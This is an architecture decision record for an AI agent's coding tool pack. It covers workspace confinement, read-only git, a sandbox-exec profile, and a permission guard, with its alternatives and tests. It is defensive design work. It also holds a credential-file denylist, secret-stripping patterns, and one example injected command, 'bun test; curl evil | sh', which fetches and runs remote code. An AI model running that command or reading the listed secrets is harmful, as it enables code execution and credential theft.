# ADR 0018 — Coding tool pack: confined file tools, read-only git, sandboxed execution, permission guard

**Status:** accepted, implemented (2026-10-27; milestone M4 of [ADR 0015](0015-unified-agent-runtime.md)).
**Contract impact:** none. A new optional package, `@agentkit/toolpacks-coding`, and an umbrella subpath
`agentkit/toolpacks-coding`. It uses only existing ports (`ToolSetContributor`, `ToolGuard`) and contracts
(`AiToolDefinition`, `AiToolResult`). `CONTRACT_VERSION` and sqlite `SCHEMA_VERSION` are unchanged.

## Problem

A coding agent needs to read, search, edit and test a repository. Left alone it uses a shell for everything, which
is slow, token-hungry and unsafe: `cat`, `sed`, `grep` and `find` through `bash` bypass every policy we could put on
a native tool. M2 gave the agent a durable session ([ADR 0016](0016-durable-agent-sessions.md)); M3a gave it its
transcript ([ADR 0017](0017-context-assembly-and-compaction.md)). It still has no tools of its own.

The tools must satisfy four constraints at once:
- **Confinement.** No argument may reach outside the workspace, even through symlinks, `~` or `..`.
- **Credentials.** A directory-wide search must never put a `.env` or a private key into the model context.
- **Honest limits.** Every bound is named, enforced and reported (`truncated`, a notice), never silent.
- **A real sandbox for the shell.** A command that does leave the tool surface must not read other projects'
  files, reach the network or write outside the workspace.

## Evidence

- Pi and OneMind already solved the individual pieces, under MIT. Pi: exact-then-normalized multi-edit, head/tail
  truncation, a per-file mutation queue, process-group kill. OneMind: workspace confinement, the sensitive-path
  lists, a pure-TS ignore-aware search, a `sandbox-exec` profile. None is a package AgentKit can depend on: Pi's
  tools are bound to its TUI and `diff` dependency, OneMind's are bound to Bun (`Glob`) and its worker protocol.
  Each adapted file carries a header naming the upstream repo, path and commit; they are listed in
  [PROVENANCE.md](../../PROVENANCE.md#third-party-adaptations).
- `ToolSetContributor` and `ToolGuard` (`packages/host/src/ports/`) are exactly the seams needed. A guard refusal
  becomes `tool_guard_refused` (`registry-staging.ts`) and its reason is shown to the model, so a refusal is
  actionable.
- `packages/testing/tests/architecture.test.ts` forbids new `.execute(` call sites in `packages/*/src`. The pack only
  defines tools; the run loop executes them. `child_process` calls are not restricted.
- `runner-local/src/file-skill-source.ts` is the in-repo confinement precedent (`O_NOFOLLOW`, `realpath`, dev/ino
  comparison). The pack follows the same discipline.

## Decision

### 1. One contributor, namespace `coding`, ten tools

`createCodingToolPack(options): ToolSetContributor` returns every tool on every run. Whether a call may proceed is
the guard's decision, not the contributor's.

| Tool | effect / capability | Limits (all in `DEFAULT_CODING_LIMITS`) |
|---|---|---|
| `read_file` | read / `fs.read` | 2000 lines, 50 KB per call, 10 MiB per file; `<n>\t<line>`; continuation notice |
| `list_dir` | read / `fs.read` | 500 entries; `/` marks directories; credential entries hidden |
| `find_files` | read / `fs.read` | glob (with `{a,b}`), 1000 results (default 200), ignore files honoured |
| `code_search` | read / `fs.read` | 10 000 entries, 1 MiB per file, 128 MiB total, 48 KiB out, 20 s, 1..1000 matches (default 100), context 0..20, lines cut at 1024 |
| `repo_map` | read / `fs.read` | manifests (2 KB excerpts) + tree, depth 3 (max 6), 400 entries |
| `git_inspect` | read / `git.read` | `status`, `diff`, `log`, `show`; 50 KB; `maxCount` 50; 20 s |
| `edit_file` | write / `fs.write` | array of `{oldText,newText}`; 5 MiB file; 32 KB diff |
| `write_file` | write / `fs.write` | 5 MiB; creates parents inside the root |
| `run_command` | write / `process.exec` | 120 s default, 600 s max; tail 2000 lines / 50 KB |
| `run_tests` | write / `process.exec` | `run_command` restricted to exact configured strings |

Every `inputSchema` is strict (`additionalProperties: false`) and uses only keywords `AiJsonSchemaObject` declares.
Every tool has a `timeoutMs` and a description. Descriptions tell the model to prefer the native tools over a shell
for exploration. A user error (bad path, no match, refusal) is an `ok:false` result with `<code>: <message>`; a tool
never throws for one. Results are compact text in `modelData`; `data` carries structured details where a UI wants
them (the edit diff and sha256, the exit code and signal).

### 2. Confinement (`src/paths.ts`, adapted from OneMind)

- The root is `realpath`ed once. A target resolves relative to it, then walks up to the nearest existing ancestor and
  `realpath`s that. A dangling symlink is refused (writing through it would create its target elsewhere). `~`, NUL
  and non-strings are refused. Anything that resolves outside the root is refused.
- The sensitive denylist applies to **both** the raw path segments and the resolved root-relative path, so an in-root
  symlink to `.env` is refused. Directories: `.git .ssh .aws .gnupg .kube .docker .azure .terraform.d`. Extensions:
  `.pem .key .p12 .pfx .jks .keystore .p8 .jwk .kdbx`. Names: `.netrc .npmrc .pypirc .git-credentials .htpasswd
  service-account.json`, any name starting `id_rsa`/`id_dsa`/`id_ecdsa`/`id_ed25519`/`credentials`/`secrets`, and
  `.env*` except `.example .sample .template .tpl .dist .default`. Denied for read and write unless `allowSensitive`.
  The prefix rule is deliberately blunt: `secrets.ts` is refused too. Opt in rather than guess.
- `.git` is readable only through `git_inspect`. Writes under `.git` are refused **even with `allowSensitive`**.
- Reads open with `O_NOFOLLOW` and compare dev/ino with the earlier `lstat`. Writes go to a temp file in the same
  directory (`wx`, fsync) and `rename` over the target, preserving the mode, under a per-realpath mutation queue
  (adapted from Pi). `edit_file` and `write_file` re-confine after taking the queue and after `mkdir`.

### 3. Editing (`src/edit-engine.ts`, adapted from Pi)

Each `oldText` must match the **original** file exactly once; edits may not overlap. If no exact match exists, a
normalized match is tried (NFKC, trailing whitespace, smart quotes, Unicode dashes and spaces) and untouched lines
keep their original bytes. CRLF and a BOM are preserved. `expectedSha256` refuses the edit if the file changed since
it was read. The unified diff is a small in-package LCS diff (no `diff` dependency; a hard cell cap degrades a huge
middle region to one remove/add block).

### 4. `git_inspect`

`execFile("git", ["-C", root, "--no-pager", "-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false", ...])`
with a fixed argv per command; there is no shell and the command name is an enum. `rev` must match
`/^[A-Za-z0-9_./~^-]{1,100}$/` **and not start with `-`** (the regex alone admits `--output=...`). `diff` and
`show` add `--no-ext-diff --no-textconv`. The environment is cleared down to `PATH`, `HOME`, `LANG` plus
`GIT_CONFIG_NOSYSTEM`, `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_TERMINAL_PROMPT=0`. Unless `allowSensitive`, `status`,
`diff` and `show` carry exclude pathspecs mirroring the denylist, so a tracked `.env` change never reaches the model
through a diff. Output is capped at 50 KB.

### 5. Shell execution (`src/exec-tools.ts`, `src/sandbox.ts`, `src/process.ts`)

- `spawn("/bin/bash", ["-c", command])`, or `spawn("/usr/bin/sandbox-exec", ["-p", profile, "/bin/bash", "-c",
  command])`, `detached: true` so the process group can be killed. `cwd` is confined.
- Profile (OneMind-derived, SBPL last-match-wins): `(allow default)`; `(deny network*)` unless `network: true`;
  `(deny file-write*)` then allow the workspace root, a private scratch directory, `/dev/null`, `/dev/tty`,
  `/dev/dtracehelper`, `/dev/fd/N`; deny `file-read-data` under `/Users /Volumes /private/tmp /private/var/folders
  /private/var/root`, then allow the root, scratch, toolchain directories under `$HOME` (OneMind's list) and the
  running node/bun executable's directory; a final deny on credential regexes (`.netrc .npmrc .pypirc
  .git-credentials`, `.cargo/credentials`, `.ssh .aws .gnupg .kube .docker`). **Added here:** writes to
  `<root>/.git/hooks` and `<root>/.git/config` are denied, so a command cannot plant a hook that later runs
  unsandboxed in the user's own git. Every path embedded in the profile must match `SAFE_PATH`
  (`/^\/[A-Za-z0-9._/-]{1,512}$/`); otherwise the call is refused.
- `sandbox: "required"` (the default) with no `sandbox-exec`, or on a non-darwin platform, returns
  `shell_isolation_unavailable`. `sandbox: "off"` must be explicit and adds a warning to every result.
- Environment: variables matching `/(TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)/i` are removed; `PATH`, `HOME`, `LANG`,
  `TERM` are always set; `TMPDIR` points at scratch (the only writable temp location).
- Timeout and `ctx.signal` abort kill the process group: `SIGSTOP` the group (so it cannot fork during the kill),
  then `SIGKILL` (Pi's `killProcessTree` plus the stop). After a normal exit the pipes get a short quiet period, then
  the group is swept so a command cannot leave daemons behind.
- Output keeps the tail (2000 lines / 50 KB). When it is cut, the full log is written to scratch (capped at 64 MiB)
  and its path is named in the notice.
- `run_tests` runs a command only if it equals one of `testCommands` exactly (`test_command_not_allowed`
  otherwise). It is not a prefix or regex match.

### 6. `CodingPermissionGuard`

`createCodingPermissionGuard({ mode, role? })` judges only tools whose namespace is `coding` and has no opinion
(`allowed: true`) on any other. Classes come from the capability: `fs.read`/`git.read` read, `fs.write` write,
`process.exec` exec. An unknown capability in the namespace is refused (fail closed).

| Role | ceiling |
|---|---|
| `supervisor` | read |
| `reviewer` | read + exec |
| `implementer` (default) | read + write + exec |

| Mode | read | write | exec |
|---|---|---|---|
| `read_only` (default) | allow | refuse `read_only: <tool> is not allowed` | refuse (same) |
| `ask` | allow | refuse `approval_required: <tool>` | refuse (same) |
| `auto_edit` | allow | allow | refuse `approval_required: <tool>` |
| `full_auto` | allow | allow | allow |

A role ceiling always wins (`role_ceiling: <role> may not use <class> tools (<tool>)`). The guard never inspects a
command's text to approve it. `ask` cannot approve anything yet: durable approval arrives in M5, and until then
`approval_required` is a plain refusal.

## Alternatives considered (rejected)

- **Depend on Pi's tool package.** Rejected: it brings a TUI, `typebox` and `diff`, and Pi's tools resolve absolute
  and parent-relative paths freely. Confinement would have to be re-imposed from outside every tool.
- **Use `git` or `rg` through the shell for search and git.** Rejected: that is the failure this ADR exists to
  remove. A shell cannot be policy-checked by its text.
- **A container or VM sandbox.** Rejected for M4: heavy, not macOS-first, and a new dependency. `sandbox-exec` is
  deprecated by Apple but ships on every supported macOS, and OneMind already runs on it.
- **Make the sandbox optional by default.** Rejected: a silent unsandboxed fallback is how this class of tool
  ships a hole. Off is explicit and warned.
- **Prefix or regex matching for `run_tests`.** Rejected: a prefix such as `bun test` also matches
  `bun test; curl evil | sh`.
- **Hide tools with `isVisible` per mode.** Not done: advertising a stable tool set keeps the model's context
  stable across a session, and the refusal reason teaches it what is missing. A host can add its own `isVisible`.

## Consequences

- AgentKit gains a usable coding loop with native, bounded, policy-checkable tools. No core, host or contract change.
- The sandbox is **not** a container. It does not hide system files (`/usr`, `/etc` stay readable), does not stop
  CPU or memory abuse, and does not isolate processes the command starts outside its group. It does stop writes
  outside the root, network, and reads of credentials and other projects' files. Treat `full_auto` as running a
  contractor in a locked room, not as running untrusted code.
- A command that needs `$HOME` state (`~/.cache`, `~/.gitconfig` writes) fails in the sandbox. That is intended.
- The workspace root must match `SAFE_PATH`; a root containing a space or `+` cannot run shell tools under the
  sandbox. The refusal says so.
- Full logs live in scratch, outside the workspace, so `read_file` cannot open them. The path is for the user; the
  model re-runs a narrower command. Scratch is deleted on `dispose()`.
- `code_search` accepts a user regex and tests it with the JS engine. A pathological pattern can stall on one line
  for longer than the 20 s budget, which is only checked between lines. Lines are cut to 8192 characters before
  matching to limit this. A worker-thread regex timeout is a possible follow-up.
- The mutation queue serializes within one process. Another process editing the same file is caught only by
  `expectedSha256`.

## Out of scope (deliberate)

- Durable approval and per-call argument hashing (M5). `run_command` is never auto-approved by its text.
- Windows and Linux sandboxes. On those, `run_command` refuses unless `sandbox: "off"`.
- Network allow-lists, resource limits, per-command filesystem grants.
- Project-instruction injection and the `workspace` session descriptor (M3a).

## Verification

- `packages/toolpacks-coding/tests/`, one file per area:
  - `paths`: `../` and absolute escape, symlink out, dangling symlink, `~`, every sensitive class for read and write
    and with `allowSensitive`, `.git` write refusal even when permissive.
  - `read-file`: numbering, offset/limit, the 2000-line and 50 KB cuts, binary, missing, oversized.
  - `edit-file`: single, multi, no match, ambiguous, overlap, CRLF and BOM, normalized fallback, sha mismatch, 25
    concurrent edits, symlink alias queueing, diff hunks; `write_file` parents, escape, `.git`, symlink escape.
  - `search`: gitignore/`.ignore`, sensitive skip, symlinks, limits and stop notices, time budget through an injected
    clock, abort, `repo_map`.
  - `git-inspect`: a real temp repo; bad and option-shaped revs; non-enumerated commands; a repository `core.fsmonitor`
    script that **does** run under plain `git status` (baseline) and never runs through the tool; sensitive diff
    exclusion; argv shape.
  - `exec` (macOS tests skip elsewhere): writes outside the root fail, network is blocked and opens with
    `network: true`, a credential directory and another temp directory are unreadable, `.git/hooks` stays read-only,
    timeout and abort leave no child alive, tail truncation with the full log, stripped secrets, and
    `shell_isolation_unavailable` through injected platform and sandbox-path options.
  - `guard`: the full mode x role x class matrix and the namespace and unknown-capability rules.
  - `contributor`: ten tools under a valid, unreserved namespace; every schema compiles in `AiToolRegistry` and
    rejects extra properties.
- The gate: `bun run typecheck`, `bun test`, `bun run lint`, `bun run build`, `node scripts/node-smoke.mjs`,
  `bun run build:umbrella && bun run smoke:umbrella`, `bun run smoke:pack`. The three smoke scripts each run one
  functional check (contribute ten tools, `read_file`, guard refusal).
